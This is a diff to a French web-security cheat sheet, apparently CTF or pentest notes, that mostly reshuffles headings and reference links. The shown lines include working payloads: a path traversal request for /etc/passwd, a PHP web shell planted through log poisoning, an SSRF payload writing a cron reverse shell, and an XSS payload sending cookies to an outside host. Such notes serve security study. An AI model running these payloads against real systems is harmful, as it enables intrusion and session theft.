@@ -196,7 +196,7 @@ sudo systemctl restart httpd
 - https://github.com/ticarpi/jwt_tool/wiki
 
 
-## GraphQL
+### GraphQL
 
  - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
  - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
@@ -204,8 +204,16 @@ sudo systemctl restart httpd
 
 ![](./images/api.gif)
 
-## File Inclusion
 
+## Path Traversal
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
+
+```bash
+curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
+```
+
+## File Inclusion
 
 ### Local & Remote File Inclusion (PHP)
 
@@ -236,7 +244,6 @@ et `.htaccess`
 ```bash
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
-curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
 ```
 
 ### XXE
@@ -470,25 +477,24 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 ## Doc - Client
 
-- https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
 - https://portswigger.net/web-security/cors
+- https://seal9055.com/blog/browser/browser_architecture
 - https://www.devsecurely.com/blog/2024/06/cors-the-ultimate-guide
+- https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
 - https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
-## Exercices
+### Challenges
 
 - https://alert.zeyu2001.com/
 
-## Obfu
+## Tools (Obfu)
 
 - https://obf-io.deobfuscate.io/
 - https://js.retn0.kr/
 
-## AST
-
-- https://seal9055.com/blog/browser/browser_architecture
 
 ![](./images/url.png)
+
 
 ## CSRF
 
@@ -509,11 +515,7 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 ![https://www.w3schools.com/js/js_htmldom.asp](./images/dom.gif)
 
 - `document.getElementById`
-
 - `document.innerHTML`
-
-Voir aussi `elements`
-
 
 `Hash (#)`
 
@@ -547,9 +549,7 @@ Voir aussi `elements`
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
 
-`Reflected XSS`
-
-Report link:
+`Reflected XSS : Report`
 
 ```html
 https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".concat(document.cookie)>
@@ -557,11 +557,10 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 [Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)
 
--> appel ou accès aux éléments du DOM (ex document.getElementByID)
+- appel ou accès aux éléments du DOM (ex document.getElementByID)
+- accès aux erreurs
 
 ![console](./images/console.png)
-
--> accès aux erreurs
 
 ### CSP
 
@@ -593,28 +592,38 @@ python -m pyftpdlib -D
 ```
 
 
+## Client Side Path Traversal 
+
+- https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/#cspt-to-xss
+- https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/#cspt-to-csrf
+
 ## Browser Cache
 
 - https://www.offensiveweb.com/docs/client-side/browser-cache/
 
+
 ## CSS Exfiltration
 
 - https://github.com/hackvertor/blind-css-exfiltration
+
 
 ## Dom Clobbering
 
 - https://www.offensiveweb.com/docs/client-side/dom-clobbering/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering
 
+
 ## HTTP Smuggling
 
 - https://franso.re/fr/blog/http_rs_pour_les_nuls
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
 
+
 ## Same Origin Method Execution + SelfXSS (+DQL injection)
 
 - https://mushroom.cat/ctf/smsv2-cyctf25-web
 - https://www.offensiveweb.com/docs/client-side/same-origin-method-execution/
+
 
 ## XS -Leaks
 
